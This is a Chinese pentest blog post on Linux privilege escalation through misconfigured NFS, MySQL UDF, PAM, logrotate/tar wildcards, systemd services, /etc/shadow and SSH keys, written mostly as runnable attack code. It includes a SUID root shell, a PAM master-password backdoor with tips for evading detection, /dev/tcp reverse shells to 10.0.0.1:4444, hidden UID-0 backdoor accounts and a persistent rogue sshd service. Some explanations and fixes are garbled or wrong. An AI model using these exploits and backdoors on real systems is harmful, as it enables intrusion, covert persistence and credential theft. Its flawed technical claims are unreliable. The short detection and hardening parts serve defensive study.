---
title: "Linux提权：服务与配置错误"
date: 2024-11-01 08:00:00
tags:
  - 权限提升
  - 渗透测试
description: Linux 服务与配置错误提权——MySQL UDF、NFS no_root_squash、Logrotate 通配符注入。
categories: 渗透测试
---

> 适用场景：已获取 Linux 低权限 shell，目标系统存在服务类配置缺陷。本文所有方法均假定攻击者拥有普通用户（或数据库用户）权限，需要进一步横向或纵向提权。

> **免责声明**：本文所述技术仅供安全研究与授权渗透测试使用。任何未经授权的攻击行为均属违法，使用者须自行承担全部法律责任。

---

## 攻击全景图

以下流程图覆盖了本文七种提权技术的攻击路径与前置条件，实战中可按图索骥快速定位可用的提权向量。

```mermaid
flowchart TD
    START["已获取低权限 Shell"]

    subgraph CHECK["信息收集阶段"]
        A1["find / -perm -o+w -ls | grep shadow 检查可写 /etc/shadow"]
        A2["mount | grep nfs 检查 NFS 导出"]
        A3["mysql -V; grep mysql /etc/passwd 检查 MySQL 服务"]
        A4["find / -writable -name '*.service' 检查可写 systemd 服务"]
        A5["find / -name authorized_keys -ls 检查 SSH 密钥位置"]
        A6["grep logrotate /etc/crontab 检查 logrotate 定时任务"]
    end

    START --> A1
    START --> A2
    START --> A3
    START --> A4
    START --> A5
    START --> A6

    A1 -->|"writable"| SHADOW["可写 /etc/shadow → 直接修改 root 密码"]
    A2 -->|"no_root_squash"| NFS["NFS no_root_squash → 挂载后 suid 提权"]
    A3 -->|"root 运行"| MYSQL["MySQL UDF/MOF → 数据库扩展提权"]
    A4 -->|"writable"| SYSTEMCTL["systemctl 服务劫持 → ExecStart 重写"]
    A5 -->|"可读"| SSH["SSH 密钥窃取 → 免密登录"]
    A6 -->|"cron + wildcard"| LOGROTATE["Logrotate 通配符注入 → 任意命令执行"]
    A7["PAM 模块后门 → 万能密码登录"]

    SHADOW --> ROOT["ROOT"]
    NFS --> ROOT
    MYSQL --> ROOT
    SYSTEMCTL --> ROOT
    SSH --> ROOT
    LOGROTATE --> ROOT
    A7 --> ROOT

    SHADOW -.->|"条件苛刻"| NOTE1["罕见但致命"]
    NFS -.->|"常见于内网"| NOTE2["NAS/NFS 共享环境"]
    MYSQL -.->|"需 CREATE FUNCTION"| NOTE3["MySQL root 密码"]
    SYSTEMCTL -.->|"需服务重启"| NOTE4["等待 reboot 或手动 restart"]
    SSH -.->|"横向为主"| NOTE5["更多用于权限维持"]
    LOGROTATE -.->|"竞争条件"| NOTE6["需 crontab 触发"]
```

---

## 一、NFS no_root_squash 提权

### 1.1 原理

NFS（Network File System）导出配置中有一个关键选项 `no_root_squash`：当远程客户端以 root 身份访问共享目录时，服务端 **不会** 将 UID 0 映射为 `nfsnobody`，而是保留 root 身份。攻击者可以在自己的机器上以 root 身份向共享目录写入 SUID 可执行文件，再回到目标系统执行该文件获取 root。

### 1.2 信息收集

在目标低权限 shell 中执行：

```bash
# 查看 NFS 挂载情况
mount | grep nfs

# 查看 /etc/exports（需 root，但有时 world-readable）
cat /etc/exports

# 使用 showmount 探测（若安装）
showmount -e 192.168.1.100
```

典型的脆弱配置如下：

```
# /etc/exports 脆弱配置示例
/home/backup  *(rw,sync,no_root_squash)
/tmp          10.0.0.0/24(rw,no_root_squash)
/data         *(rw,sync,no_root_squash,no_subtree_check)
```

### 1.3 攻击步骤

**Step 1：在攻击机上挂载 NFS 共享**

```bash
# 安装 NFS 客户端
apt install nfs-common -y

# 挂载目标 NFS 共享
mount -t nfs 192.168.1.100:/home/backup /tmp/nfs_mount
```

**Step 2：创建 SUID root shell**

```bash
# 编写 C 程序
cat > /tmp/nfs_mount/suid_shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# 以 root 身份编译并设置 SUID
gcc /tmp/nfs_mount/suid_shell.c -o /tmp/nfs_mount/suid_shell
chown root:root /tmp/nfs_mount/suid_shell
chmod 4777 /tmp/nfs_mount/suid_shell
```

**Step 3：在目标机器执行 SUID 程序**

```bash
# 回到目标 shell，执行 NFS 上的 SUID 程序
/tmp/backup/suid_shell
# 或
/home/backup/suid_shell

# 验证
id   # uid=0(root) gid=0(root)
```

### 1.4 变体：no_root_squash + SSH authorized_keys

如果 NFS 共享包含了用户家目录，可以直接植入 SSH 公钥：

```bash
# 在攻击机上生成密钥对
ssh-keygen -t rsa -f /tmp/nfs_key -N ""

# 将公钥写入目标用户的 authorized_keys
mkdir -p /tmp/nfs_mount/.ssh
cp /tmp/nfs_key.pub /tmp/nfs_mount/.ssh/authorized_keys

# 使用私钥免密登录
ssh -i /tmp/nfs_key user@192.168.1.100
```

---

## 二、MySQL UDF / MOF 提权

### 2.1 原理

MySQL 提供了用户自定义函数（User Defined Function, UDF）机制，允许通过共享库（`.so`）扩展 SQL 功能。当 MySQL 以 root 身份运行时，攻击者可将恶意共享库写入插件目录，创建自定义函数调用 `system()`，从而以 MySQL 进程身份执行任意系统命令。

在 Windows 上，对应技术为 MOF（Managed Object Format）文件写入，通过 WMI 事件订阅执行命令。

### 2.2 前置条件检查

```sql
-- 进入 MySQL 后执行
SELECT @@plugin_dir;                    -- 查看插件目录
SELECT @@secure_file_priv;              -- 查看文件写限制（需为空或包含插件目录）
SHOW VARIABLES LIKE '%compile%';        -- 获取系统架构 (x86_64 / i686)
SHOW VARIABLES LIKE '%version%';        -- 获取 MySQL 版本
```

```bash
# 检查 MySQL 进程权限
ps aux | grep mysql
# root 运行的输出示例：
# root  1234  0.0  3.2  996088 65536 ?  Ssl  10:00  0:02 /usr/sbin/mysqld
```

### 2.3 Linux UDF 提权

**Step 1：定位或编译共享库**

Kali 自带预编译的 `raptor_udf2.so`，位于 `/usr/share/metasploit-framework/data/exploits/mysql/`：

```bash
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so /tmp/udf.so
```

或自行编译：

```c
// raptor_udf2.c
#include <stdio.h>
#include <stdlib.h>
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
typedef struct st_udf_args {
    unsigned int arg_count;
    enum Item_result *arg_type;
    char **args;
    unsigned long *lengths;
    char *maybe_null;
} UDF_ARGS;
typedef struct st_udf_init {
    char maybe_null;
    unsigned int decimals;
    unsigned long max_length;
    char *ptr;
    char const_item;
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->arg_count != 1) return 1;
    return system(args->args[0]);
}
```

编译命令：

```bash
gcc -shared -fPIC -o udf.so raptor_udf2.c
```

**Step 2：写入共享库并创建函数**

```sql
-- 1. 创建临时表装载二进制数据
USE mysql;
CREATE TABLE udf_data (data LONGBLOB);
INSERT INTO udf_data VALUES (LOAD_FILE('/tmp/udf.so'));
SELECT data FROM udf_data INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 2. 创建自定义函数
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'udf.so';

-- 3. 执行系统命令
SELECT do_system('chmod +s /bin/bash');

-- 4. 提权
-- 在 shell 中执行
/bin/bash -p
```

**Step 3：清理痕迹**

```sql
DROP FUNCTION do_system;
DROP TABLE udf_data;
```

### 2.4 Windows MOF 提权（简述）

```sql
-- 写入 MOF 文件到 WMI 目录（%SystemRoot%\system32\wbem\mof\）
SELECT 0x... INTO DUMPFILE 'C:/windows/system32/wbem/mof/evil.mof';
```

MOF 文件注册后，WMI 会在 5 秒内自动执行其中定义的命令，常用于反弹 shell。

---

## 三、PAM 模块后门

### 3.1 原理

PAM（Pluggable Authentication Modules）是 Linux 认证体系的核心。通过替换或修改 PAM 模块（如 `pam_unix.so`），攻击者可以植入"万能密码"——任意用户在任何密码（或特定密码）下均可认证成功，实现权限维持与横向移动。

### 3.2 目标 PAM 配置文件

| 文件路径 | 作用 |
|---|---|
| `/etc/pam.d/common-auth`（Debian/Ubuntu） | 系统级认证配置 |
| `/etc/pam.d/sshd` | SSH 服务认证 |
| `/etc/pam.d/login` | 本地登录认证 |
| `/etc/pam.d/su` | su 切换用户认证 |
| `/lib/x86_64-linux-gnu/security/pam_unix.so` | UNIX 密码认证模块本体 |

### 3.3 手工植入简易 PAM 后门

**方法一：修改 pam_unix.so 源码并替换**

从 `Linux-PAM` 源码包入手，修改 `modules/pam_unix/pam_unix_auth.c` 中的密码验证逻辑：

```c
// 在 pam_sm_authenticate() 中添加后门逻辑
if (strcmp(p, "backdoor123") == 0) {
    pam_set_item(pamh, PAM_USER, (const void *)username);
    retval = PAM_SUCCESS;
    goto done;
}
```

重新编译后替换原始 `.so`，注意备份 mtime（修改时间）以规避检测。

**方法二：插入自定义 pam_exec 模块**

该方法无需编译，利用 PAM 的 `pam_exec.so` 模块调用外部脚本：

```bash
# 在 /etc/pam.d/common-auth 首行插入
auth    sufficient    pam_exec.so    /bin/sh -c "touch /tmp/pam_backdoor"

# 或写入后门密码检查脚本
cat > /usr/local/share/pam_backdoor.sh << 'EOF'
#!/bin/bash
# 读取密码（模拟）
read pass
if [ "$pass" = "magic_key_2024" ]; then
    exit 0   # PAM_SUCCESS
fi
exit 1       # PAM_AUTH_ERR
EOF
chmod +x /usr/local/share/pam_backdoor.sh
```

然后在 `/etc/pam.d/common-auth` 中引用：

```
auth    sufficient    pam_exec.so    expose_authtok /bin/bash /usr/local/share/pam_backdoor.sh
```

### 3.4 检测与防御

```bash
# 检查 PAM 模块哈希是否变更
md5sum /lib/x86_64-linux-gnu/security/pam_unix.so

# 审计 PAM 配置中异常的模块引用
grep -r "pam_exec\|pam_userdb" /etc/pam.d/

# 使用 AIDE / Tripwire 建立文件完整性基线
aide --check
```

---

## 四、Logrotate 通配符注入

### 4.1 原理

Logrotate 常通过 root 用户的 crontab 定时执行。其配置文件中若使用了包含通配符的 `prerotate` / `postrotate` 脚本，且通配符在可写目录下展开，则攻击者可通过精心构造的文件名注入命令参数或子命令。

典型场景：管理员在可写目录（如 `/tmp`、`/var/log/app`）下配置了通配符日志轮替。

### 4.2 漏洞触发条件

```bash
# 示例脆弱配置 /etc/logrotate.d/app
/var/log/app/*.log {
    daily
    rotate 7
    compress
    prerotate
        /usr/bin/chown nobody:nogroup /var/log/app/*
    endscript
}
```

`/var/log/app/*` 通配符在可写目录 `/var/log/app` 中展开，攻击者可在该目录下创建如下特殊文件名：

```bash
# 利用 --reference 参数将任意文件变更为 root 所有
touch '/var/log/app/--reference=/etc/shadow'

# chown 命令实际展开为：
# /usr/bin/chown nobody:nogroup --reference=/etc/shadow /var/log/app/input.log
# 这会导致 /etc/shadow 的 owner 引用至目标文件，从而间接获取 shadow 的读取权限
```

### 4.3 完整利用链

```bash
# Step 1：在当前可写日志目录中创建恶意文件名
cd /var/log/app

# 创建符号链接，指向 /etc/bash.bashrc（或 /etc/crontab）
touch '--reference=/etc/bash.bashrc'

# Step 2：创建第二个"诱饵"文件，使通配符正常匹配
touch input.log

# Step 3：等待 logrotate crontab 触发（通常每日执行）
# 或：sudo logrotate -f /etc/logrotate.d/app（若能触发）

# Step 4：验证 /etc/bash.bashrc 的属主是否变为 nobody
ls -la /etc/bash.bashrc

# Step 5：若 chown 成功改变了系统文件属主，则可写入恶意内容
echo 'cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell' >> /etc/bash.bashrc

# Step 6：等待 root 用户下一次登录触发
/tmp/rootshell -p
```

### 4.4 利用 tar 的 checkpoints 参数

更直接的 RCE 方式——若 `postrotate` 中使用了 `tar` 命令：

```bash
# 脆弱配置中的 tar 命令
#   postrotate
#       tar -czf /backup/logs.tar.gz /var/log/app/*
#   endscript

# 攻击者创建特殊文件名
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > '/var/log/app/--checkpoint=1'
echo '' > '/var/log/app/--checkpoint-action=exec=sh shell.sh'
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > '/var/log/app/shell.sh'

# 当 tar 执行时：
# tar -czf /backup/logs.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh input.log
# 达到第 1 个检查点后执行 shell.sh，反弹 root shell
```

---

## 五、Systemctl 服务配置缺陷

### 5.1 原理

systemd 是现代 Linux 的标准 init 系统。若某个 systemd service 文件的 `ExecStart`、`ExecStartPre`、`ExecStartPost` 指令指向了攻击者可写的脚本或二进制文件，当该服务启动时，恶意代码将以 **root 身份** 执行。

### 5.2 发现可写的 Service 文件

```bash
# 查找所有可写的 .service 文件
find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system \
    -name '*.service' -writable -ls 2>/dev/null

# 查找可写的服务启动脚本
find / -path /proc -prune -o -type f \
    \( -path '*/systemd/*' -o -path '*/init.d/*' \) \
    -writable -ls 2>/dev/null

# 使用 systemctl 查看服务的完整配置
systemctl cat vulnerable-service.service
```

### 5.3 攻击方法

**方法 A：直接覆写 ExecStart**

```bash
# 假设 /etc/systemd/system/cleanup.service 可写
cat > /etc/systemd/system/cleanup.service << 'EOF'
[Unit]
Description=System Cleanup Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell'
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# 重载并启动（若拥有 sudo systemctl 权限）
systemctl daemon-reload
systemctl start cleanup.service

# 或等待系统重启后自动执行
# systemctl enable cleanup.service
```

**方法 B：劫持可写脚本**

```bash
# 服务指向了可写路径
# ExecStart=/usr/local/bin/maintenance.sh (world-writable)

cat > /usr/local/bin/maintenance.sh << 'EOF'
#!/bin/bash
# 后门载荷
useradd -u 0 -g 0 -o -M backdoor_user
echo 'backdoor_user:password123' | chpasswd
# 原服务逻辑（避免管理员发现）
/usr/bin/systemctl --quiet is-active original-service && echo "OK"
EOF
chmod +x /usr/local/bin/maintenance.sh
```

**方法 C：利用 EnvironmentFile**

```bash
# 若 service 使用了 EnvironmentFile 且该文件可写
# EnvironmentFile=/etc/default/myservice (writable)

echo 'LD_PRELOAD=/tmp/evil.so' >> /etc/default/myservice
# 下次服务启动时加载恶意共享库

# 编译 preload 库
cat > /tmp/preload.c << 'EOF'
#include <unistd.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash -c 'chmod +s /bin/bash'");
}
EOF
gcc -shared -fPIC -o /tmp/evil.so /tmp/preload.c
```

### 5.4 持久化

```bash
# 创建新的恶意服务实现持久化
cat > /etc/systemd/system/ssh-backdoor.service << 'EOF'
[Unit]
Description=SSH Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/sshd -f /tmp/sshd_config -p 2222
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now ssh-backdoor.service
```

---

## 六、可写 /etc/shadow

### 6.1 原理

`/etc/shadow` 存储所有用户的密码哈希。若该文件 world-writable（权限 `----------` 以外），攻击者可直接修改 root 密码或插入新建用户。

### 6.2 检测

```bash
# 检查 /etc/shadow 权限
ls -la /etc/shadow
# 正常输出：-rw-r----- 或 -rw-------
# 危险输出：-rw-rw-rw- 或 -rwxrwxrwx

# 自动化检测
[ -w /etc/shadow ] && echo "[!] /etc/shadow is writable — possible privilege escalation"
```

### 6.3 利用方式

**方式一：修改 root 密码哈希**

```bash
# 在攻击机上为 'pwned123' 生成新哈希
openssl passwd -6 'pwned123'
# 输出：$6$random_salt$hash_value...

# 或使用 Python 生成
python3 -c 'import crypt; print(crypt.crypt("pwned123", crypt.mksalt(crypt.METHOD_SHA512)))'
```

```bash
# 备份原始 shadow
cp /etc/shadow /tmp/shadow.backup

# 替换 root 的密码哈希字段（第二栏）
sed -i 's/^root:[^:]*:/root:$6$random_salt$hash_value...:/' /etc/shadow

# 验证
su - root
# 输入：pwned123
# id  # uid=0(root)
```

**方式二：新增 UID 0 用户**

```bash
# 生成哈希
NEW_HASH=$(python3 -c 'import crypt; print(crypt.crypt("backdoor", crypt.mksalt(crypt.METHOD_SHA512)))')

# 追加 UID 0 用户
echo "backdoor:${NEW_HASH}:0:0:root:/root:/bin/bash" >> /etc/shadow

# 同步写入 /etc/passwd（如果也可写）
echo "backdoor:x:0:0:root:/root:/bin/bash" >> /etc/passwd

# 登录
su backdoor
```

### 6.4 快速恢复检测

```bash
# 列出最近修改的系统文件
ls -lt /etc/shadow /etc/passwd /etc/group | head -5

# 检查 uid=0 的重复用户
awk -F: '($3 == 0) {print $1}' /etc/passwd
# 正常输出仅：root
```

---

## 七、SSH 密钥窃取与横向移动

### 7.1 原理

SSH 密钥是 Linux 运维中最普遍的认证方式之一。低权限用户若能读取其他用户（尤其是 root）的私钥文件，即可无需密码直接横向登录。此类问题常见于备份脚本错误、ACL 配置不当或密钥文件权限设置疏忽。

### 7.2 信息收集

```bash
# 查找所有 authorized_keys 文件
find / -name authorized_keys -exec ls -la {} \; 2>/dev/null

# 查找可读的 SSH 私钥
find / \( -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' \
    -o -name 'id_ed25519' -o -name '*.pem' \) \
    -readable -exec ls -la {} \; 2>/dev/null

# 查找家目录下 .ssh 目录
find /home /root -name '.ssh' -type d -exec ls -la {} \; 2>/dev/null
```

### 7.3 利用流程

```bash
# Step 1：定位私钥
cat /home/admin/.ssh/id_rsa
# 或
cat /root/.ssh/id_rsa

# Step 2：复制到攻击机
# -----BEGIN OPENSSH PRIVATE KEY-----
# ... 密钥内容 ...
# -----END OPENSSH PRIVATE KEY-----

# Step 3：在攻击机上设置权限并连接
chmod 600 stolen_key
ssh -i stolen_key admin@192.168.1.100
# 若密钥有密码短语，使用 john 破解：
ssh2john stolen_key > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

### 7.4 利用 known_hosts 横向移动

```bash
# known_hosts 揭示了目标主机连接过哪些服务器
cat /home/admin/.ssh/known_hosts
# 输出：
# 10.0.1.50 ssh-rsa AAAAB3NzaC1...
# 10.0.1.51 ecdsa-sha2-nistp256 AAAAE2VjZ...

# 结合 ~/.ssh/config 获取更多连接细节
cat /home/admin/.ssh/config
```

### 7.5 利用 SSH Agent Forwarding

```bash
# 检查是否存在活动的 SSH agent socket
env | grep SSH_AUTH_SOCK
# SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.1234

# 若存在，直接使用该 socket 认证
SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.1234 ssh user@internal-server

# 列出 agent 中加载的密钥
ssh-add -l
```

---

## 总结与检测

| 漏洞类型 | 利用条件 | 影响 | 修复方案 |
|---|---|---|---|
| NFS no_root_squash | NFS 导出配置含 `no_root_squash` | 任意 code execution via SUID | 移除 `no_root_squash`，使用 Kerberos 认证 |
| MySQL UDF | MySQL 以 root 运行 + 可写 plugin 目录 | 以 MySQL 进程权限执行命令 | 降权运行 MySQL，禁用 `secure_file_priv` |
| PAM 后门 | 可修改 PAM 模块或配置 | 持久化万能密码认证 | 监控 PAM 模块完整性（AIDE），限制 `/etc/pam.d` 权限 |
| Logrotate 通配符 | cron + 可写日志目录 + 通配符命令 | RCE via wildcard injection | 使用 `--` 参数终止符，脚本中避免通配符 |
| systemctl 劫持 | 可写 service 文件或启动脚本 | 以 root 执行任意代码 | 限制 service 文件权限为 644 root:root |
| 可写 /etc/shadow | shadow 文件权限松散 | 直接修改 root 密码 | `chmod 000 /etc/shadow` 并按需设 400 |
| SSH 密钥泄露 | 私钥文件 world-readable | 免密横向移动 | `chmod 600 ~/.ssh/id_*`，禁止私钥全局可读 |

### 通用检测命令

```bash
# 一键检测当前主机的常见配置问题
echo "[*] Checking writable /etc/shadow..."
[ -w /etc/shadow ] && echo "  [!] /etc/shadow is WRITABLE"

echo "[*] Checking NFS exports with no_root_squash..."
grep -r "no_root_squash" /etc/exports 2>/dev/null && echo "  [!] no_root_squash found"

echo "[*] Checking writable systemd services..."
find /etc/systemd/system /lib/systemd/system -name '*.service' -writable 2>/dev/null

echo "[*] Checking world-readable SSH keys..."
find / -maxdepth 3 -name 'id_*' -perm /o+r 2>/dev/null

echo "[*] Checking logrotate wildcard usage..."
grep -rn '\*' /etc/logrotate.d/ 2>/dev/null | grep -v '^#'

echo "[*] Verifying PAM module hashes..."
md5sum /lib/x86_64-linux-gnu/security/pam_unix.so
```

---

> **后记**：服务配置错误是 Linux 提权中最容易被忽视的攻击面之一。相对于内核漏洞提权，配置型提权更稳定、更隐蔽、更难以被安全软件检测。防御的核心在于 **最小权限原则**、**配置硬化** 与 **文件完整性监控** 三管齐下。每一次权限提升都可能成为攻击链的关键一环，防守者必须从攻击者视角审视系统配置的每处细节。
